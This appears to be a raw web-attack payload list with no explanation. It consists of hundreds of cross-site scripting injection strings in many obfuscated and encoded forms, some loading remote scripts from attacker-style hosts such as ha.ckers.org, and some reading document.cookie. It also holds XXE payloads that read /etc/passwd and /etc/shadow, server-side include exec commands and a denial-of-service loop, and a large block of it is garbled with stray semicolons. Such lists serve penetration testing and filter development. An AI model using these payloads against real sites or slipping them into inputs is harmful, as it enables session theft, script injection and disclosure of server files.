&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;a=/XSS/
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&{document.vulnerable=true;};
' "/><img src= x onerror=prompt(/xss/)>
'""><script language="JavaScript"> alert('X \nS \nS');</script>
'"--></style></scRipt><scRipt>alert('XSSPOS ED')</scRipt>
'"></title><script>alert(1111)</script>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
'">><marquee><h1>XSS</h1></marquee>
'">><script>alert('XSS')</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'">>"
'';!--"<XSS>=&{()}
'';!--\"&lt;XSS&gt;=&{()}
'); alert('XSS
'); alert('xss'); var x='
';';;!--";<;XSS>;=&;{()}
';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
';alert(/xss/)///
';alert(/xss/)///';alert(1)//";alert(2)///";alert(3)//--></SCRIPT>">'><SCRIPT>alert(/xss/)</SCRIPT>=&{}");}alert(6);functions+xss(){//
';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
';alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//\"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT> alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
'<script>alert('xss message')</script>
'>"><script src = 'http://www.site.com/XSS.js'></script>
'>//\\,<'>">">"*"
'></select><script>alert(123)</script>
'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
'>><marquee><h1>XSS</h1></marquee>
'`"><\x00script>javascript:alert(1)</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'onerror='alert('XSS')' a='.jpg
'|alert('XSS')|'
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
/><script>window.alert('XSS Vulnerable');</script>
/?#&;:="%<>@[\\]^`{|}
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1script3document.vulnerable=true;1/script3
;<><script></script>/<script>alert('0')</script>
<! foo="><script>alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
<!--<img src="--><img src=x onerror=alert(123)//">
<!--<img src="--><img src=x onerror=alert(XSS)//">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<!--[if]><script>javascript:alert(1)</script -->
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
<![<!--]]<script>document.vulnerable=true;//--></script>
<![><img src="]><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<% foo><x foo="%><script>alert(123)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<%<!--'%><script>alert(1);</script -->
<--`<img/src=` onerror=alert(1)> --!>
</ foo="><script>alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<// style=x:expression\28javascript:alert(1)\29>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
</XSS STYLE=xss:expression(alert('XSS'))>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
</a onmousemove="alert(1)">
</br style=a:expression(alert())>
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</script></script><<<<script><>>>><<<script>alert(123)</script>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
</script><script >alert(document.cookie)</script>
</script><script>alert(“Xss”)</script>
</script><script>alert(1)</script>
</script><script>prompt("test")</script>
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
</style ><script :-(>/**/alert(document.location)/**/</script :-(
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
</textarea>'"><script>alert(document.cookie)</script>
</textarea><script>alert(/xss/)</script>
</title><SCRIPT>document.vulnerable=true;</script>
</title><script>alert(/xss/)</script>
<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
<;!--[if gte IE 4]>;
<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
<;/br style=a:expression(alert())>;
<;/script>;<;script>;alert(1)<;/script>;
<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
<;? echo(';<;SCR)';;
<;A HREF=";//google";>;XSS<;/A>;
<;A HREF=";//www.google.com/";>;XSS<;/A>;
<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
<;A HREF=";http://1113982867/";>;XSS<;/A>;
<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
<;A HREF=";http://google.com/";>;XSS<;/A>;
<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
<;A HREF=";http://www.google.com./";>;XSS<;/A>;
<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
<;BASE HREF=";javascript:alert(';XSS';);//";>;
<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
<;BODY ONLOAD=alert(';XSS';)>;
<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;BR SIZE=";&;{alert(';XSS';)}";>;
<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
<;DIV STYLE=";width: expression(alert(';XSS';));";>;
<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
<;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>;
<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
<;HTML xmlns:xss>;
<;HTML>;<;BODY>;
<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
<;IMG DYNSRC=";javascript:alert(';XSS';);";>;
<;IMG LOWSRC=";javascript:alert(';XSS';);";>;
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
<;IMG SRC=";javascript:alert(';XSS';)";
<;IMG SRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=";livescript:[code]";>;
<;IMG SRC=";mocha:[code]";>;
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;
<;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;
<;IMG SRC=javascript:alert(';XSS';)>;
<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;
<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
<;SCRIPT SRC=//ha.ckers.org/.j>;
<;SCRIPT SRC=http://ha.ckers.org/xss.js
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT>;a=/XSS/
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>;
<;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
<;scrscriptipt>;alert(1)<;/scrscriptipt>;
<<SCRIPT>%(payload)s//<</SCRIPT>
<<SCRIPT>alert(“XSS”);//<</SCRIPT>
<<SCRIPT>alert(“Xss”);//<</SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
<<script>document.vulnerable=true;</script>
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
<? foo="><script>alert(1)</script>">
<? foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<A HREF="htt    p://6    6.000146.0x7.147/">XSS</A>
<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://66.102.7.147/">XSS</A>
<BASE HREF="javascript:alert('XSS');//">
<BASE HREF="javascript:javascript:alert(1);//">
<BGSOUND SRC="javascript:alert('XSS');">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert(‘XSS’)>
<BODY ONLOAD=alert(’XSS’)>
<BODY ONLOAD=alert("XSS")>
<BODY ONLOAD=alert('XSS')>
<BODY ONLOAD=alert('hellox worldss')>
<BODY ONLOAD=javascript:alert(1)>
